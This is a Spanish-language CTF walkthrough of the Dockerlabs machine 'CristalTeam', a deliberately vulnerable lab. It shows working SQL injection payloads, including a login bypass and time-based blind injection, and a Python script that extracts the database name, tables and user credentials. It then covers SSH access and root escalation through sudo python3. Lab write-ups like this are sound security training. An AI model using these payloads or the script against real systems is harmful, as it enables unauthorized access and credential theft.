
# Writeup Template: Maquina `[ CristalTeam ]`

- Tags: #CristalTeam
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina CristalTeam](https://mega.nz/file/8KNwjC7b#jwE74Xa2ftBftZWaxTWkRm3w_-NOIZ7ziX8UGWS_VjM) Crystalteam es una máquina vulnerable basada en Docker, diseñada para poner a prueba habilidades en la explotación de bases de datos mediante inyecciones SQL (SQLi). Su enfoque principal es la identificación y explotación de vulnerabilidades en consultas MySQL para obtener acceso no autorizado a la base de datos y extraer información sensible.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x crystalteam.zip
sudo bash auto_deploy.sh crystalteam.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((DebianOracular))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```

Para tener acesso al panel principal tenemos que accerder a la siguiente ruta:
```bash
http://172.17.0.2/Certificacion/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/Certificacion/
http://172.17.0.2/Certificacion/ [200 OK] Apache[2.4.62], Bootstrap, Country[RESERVED][ZZ], Email[crystalteamem@gmail.com], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.2], JQuery[3.4.1], Lightbox, Script, Title[CrystalTeam]
```

Tenemos un correo:
```bash
crystalteamem@gmail.com
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/Certificacion/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/img/                 (Status: 200) [Size: 17645]
/mail/                (Status: 200) [Size: 1412]
/css/                 (Status: 200) [Size: 1175]
/lib/                 (Status: 200) [Size: 1973]
/js/                  (Status: 200) [Size: 965]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/Certificacion/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 19091]
/img                  (Status: 301) [Size: 320] [--> http://172.17.0.2/Certificacion/img/]
/contact.html         (Status: 200) [Size: 8747]
/about.html           (Status: 200) [Size: 17222]
/login.php            (Status: 200) [Size: 6928]
/mail                 (Status: 301) [Size: 321] [--> http://172.17.0.2/Certificacion/mail/]
/css                  (Status: 301) [Size: 320] [--> http://172.17.0.2/Certificacion/css/]
/virus.php            (Status: 200) [Size: 16483]
/lib                  (Status: 301) [Size: 320] [--> http://172.17.0.2/Certificacion/lib/]
/js                   (Status: 301) [Size: 319] [--> http://172.17.0.2/Certificacion/js/]
/seguridad.php        (Status: 200) [Size: 10366]
/registro.php         (Status: 200) [Size: 7273]
/curso.php            (Status: 200) [Size: 18296]
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Auditando el panel de login vemos que logramos corrompeer la query en la siguiente ruta, Asi que intentaremos realizar inyecciones **SQL**
```bash
http://172.17.0.2/Certificacion/login.php
```

Logramos romper la consulta sql colocando comilla simple
```bash
admin'
```

Ganamos acceso inyectando esta consulta **sql**
```bash
admin' or 1=1-- -
```
### Ejecucion del Ataque
El objetivo es obtener informacion de la base de datos:
```bash
# Comandos para explotación
admin' or sleep(10)-- -
```

Ahora lo que aremos es intercpetar la peticion para aplicar las inyecciones, Asi que lanzamos **burpsuite**
```bash
burpsuite &>/dev/null & disown
```

Una ves interceptada la peticion tenemos lo siguiente:
```bash
POST /Certificacion/login.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Origin: http://172.17.0.2
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://172.17.0.2/Certificacion/login.php
Cookie: PHPSESSID=mgok7eq8hsabfr026blqq8aao9
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Ahora debemos determinar la longitud de la based de datos: Logramos determinar la longituda de la base de datas:
```bash
usuario=admin' or if(length(database())>=6, sleep(3), 0)-- -&contrasena=admin123
```

Ahora sabemos que el primer caracter de la base de datos es la letra **i**
```bash
usuario=admin' or if(substring(database(),1,1)='i', sleep(3), 0)-- -&contrasena=admin123
```

Ahora necesitamos automatizar estraer el nombre completo de la base de datos para en base a eso poder seguir enumerando
Este es nuestro script en python **sqli_cristal.py**
```python
#!/usr/bin/env python3

# Librerias
from termcolor import colored as c 
import requests
import time 
import sys
import signal
import string

# Fucniones personalizadas
def ctr_c(sig, frame):
    print(c(f"\n[-] Saliendo...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, ctr_c)

# Variables globales
main_url = "http://172.17.0.2/Certificacion/login.php"
characters = string.ascii_letters + string.digits + '_,'

def main():
    print(c(f"\n[+] Iniciando ataque...\n", "red"))

    extracted_data = ""

    for position in range(1,7):
        for character in characters:
            payload = f"admin' or if(substring(database(),{position},1)='{character}', sleep(2), 0)-- -"
            
            time_start = time.time()
            r = requests.post(main_url, data={"usuario": payload, "contrasena": "admin123"})
            time_end = time.time()

            if time_end - time_start > 2:
                extracted_data += character
                break

    print(c(f"\n[+] Nombre de la base de datos: ( {extracted_data} )", "green"))

# flujo principal del programa
if __name__ == '__main__':
    main()
```

Lo ejecutamos logrando obtener el nombre de la base de datos basandonos en el tiempo de respuesta de la aplicacion
```bash
python3 sqli_scristal.py

[+] Iniciando ataque...
```

Tenemos el nombre de la base de datos actualmente en uso:
```bash
[+] Nombre de la base de datos: ( inicio )
```

**Nota** Ahora solo tenemos que ir modificando el **payload** para ir obteniedo la informacion:
```python
payload = f"admin' or if(substring((select group_concat(table_name SEPARATOR ',') from information_schema.tables where table_schema = 'inicio'),{position},1)='{character}', sleep(1), 0)-- -"
```

```
# Dumpeamos el nombre de la tablas para la base de datos
[+] Nombre de las tablas: ( personales )
```

Ahora dumpeamos los nombres de las columnas para esa tabla:
```python
payload = f"admin' or if(substring((select group_concat(column_name SEPARATOR ',') from information_schema.columns where table_schema = 'inicio' and table_name = 'personales'),{position},1)='{character}', sleep(1), 0)-- -"
```

Resultado:
```bash
[+] Nombre de las columnas: ( id,nombre,apellidos,correo,usuario,contrasena,token,fecha_registro )
```

Ahora nos aprovechamos de esto para enumerar nombre de usuario y contrasena
```python
payload = f"admin' or if(substring((select group_concat(usuario,0x3a,contrasena SEPARATOR ',') from inicio.personales),{position},1)='{character}', sleep(1), 0)-- -
```

Para la ultima parte tratamos la cadena final:
```python
users = extracted_data.split(", ")
print(c(f"Credenciales encontradas:", "cyan"))
for user in users:
    print(c(f"\n( - {user} )", "green"))
```

Encontramos credenciales:
```bash
Credenciales encontradas:

( - alejandrohanka,root,pinmarpi7tmy,h1h1dxhbxu,testes9aljfq )
```
### Intrusion
Ahora podemos intentar conectarnos por ssh con estos usaurios:
```bash
# Reverse shell o acceso inicial
ssh alejandro@172.17.0.2 # ( hanka )
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
alejandro:x:1000:1000::/home/alejandro:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ alejandro ]`:
Listando los permisos para este usuario tenemos lo siguiente:
```bash
sudo -l

User alejandro may run the following commands on 0bc8a3ddf2a5:
    (ALL) NOPASSWD: /usr/bin/python3
```

Abusamos del bianrio:
```bash
# Comando para escalar al usuario: ( root )
alejandro@0bc8a3ddf2a5:~$ sudo -u root /usr/bin/python3 -c 'import os; os.system("/bin/bash -p")'
```

---

## Evidencia de Compromiso
Flag de **root**
```bash
cat redflag.txt 
root = 2773532
```

```bash
# Captura de pantalla o output final
root@0bc8a3ddf2a5:/home/alejandro# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a explotar un login de formulario vulnerable a inyecciones SQL basdas en tiempo
2. Aprendimos a automatizar con python la inyeccion para lograr dumpear toda las base de datos
3. Aprendimos a abusar del binario de python